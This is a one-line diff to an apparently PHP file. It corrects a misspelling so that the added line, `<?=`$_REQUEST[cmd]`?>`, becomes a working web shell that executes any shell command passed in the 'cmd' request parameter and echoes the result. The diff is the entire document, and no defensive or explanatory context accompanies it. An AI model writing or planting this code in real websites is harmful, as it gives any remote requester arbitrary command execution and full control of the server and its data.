@@ -1,1 +1,1 @@
-<?=`$_REQQUEST[cmd]`?>
+<?=`$_REQUEST[cmd]`?>
